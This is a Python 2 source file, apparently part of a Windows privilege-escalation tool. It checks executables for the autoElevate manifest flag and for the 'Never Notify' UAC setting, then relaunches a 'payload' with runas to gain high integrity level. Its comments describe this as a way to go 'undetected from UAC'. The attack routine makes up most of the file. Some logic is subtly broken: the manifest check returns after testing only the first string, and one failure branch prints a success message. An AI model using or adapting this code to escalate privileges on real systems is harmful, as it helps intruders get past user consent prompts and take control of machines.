import os
import sys
import ctypes
import _winreg
from prints import *
from uac import *

def manifests(exe_path):
	"""
	Simple technique to identify if the executable has autoElevate
	set to True in its manifest, very n00bie
	"""
	strings = ["<autoElevate>true</autoElevate>",
			"<autoElevate xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</autoElevate>"]
	
	try:
		manifest = open(os.path.join(exe_path), "rb").read()
	except Exception as error:
		return False

	for string in strings:
		if (string in manifest):
			return True
		else:
			return False

def runas(exe_path):
	print """
 -------------------------------------------------------------
 If UAC level is set to never notify we'll use runas to
 elevate our given executable or if the given executable is
 set to auto-elevate upon execution, runas will be used
 without looking at UAC levels.

 When everything worked correctly, the payload should be
 spawned with high IL.
 -------------------------------------------------------------
 """
	print_info("Process: {}".format(exe_path))
 	"""
	If the hijacked executable is set to auto elevate upon
	execution, we use runas to elevate it. This way we go
	undetected from UAC if not set on highest Notify Always
	"""
	print_info("Attempting to find given executable path on disk")
	if (os.path.isfile(os.path.join(exe_path)) == True):
		print_success("Successfully found given executable path on disk")
		print_info("Attempting to identify if process is set to auto-elevate by reading manifest")
		if (manifests(exe_path) == True):
			print_info("Process is set to auto-elevate upon execution")
			if (ctypes.windll.Shell32.ShellExecuteA(None,"runas",os.path.join(exe_path),None,None,1) == 42):
				print_success("Process started successfully using runas")
				sys.exit()
			else:
				print_success("Problem creating process using runas")
				return False
		else:
			print_warning("The process is NOT set to auto-elevate...")
	else:
		print_error("Unable to find process on disk, wrong path?")
		return False
		
	"""
	If the executable is not set to auto-elevate, we continue by
	checking status of UAC, if set to not notify, we use runas to
	elevate executable.
	"""
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print_info("We are already running as administrator, cannot proceed")
		return False
	else:
		print_success("Attempting to identify UAC level")
		if (uac_status() == True):
			print_success("UAC level is set to Never Notify")
			try:
				if (ctypes.windll.Shell32.ShellExecuteA(None,"RunAs",exe_path,None,None,1) == 42):
					print_success("Successfully elevated our process with runas")
				else:
					print_error("Unable to elevate our process with runas")
			except Exception as error:
				print_error("Unable to elevate our process with runas")
				return False
		else:
			print_error("UAC level is to high, cannot proceed without triggering UAC prompt")
			return False
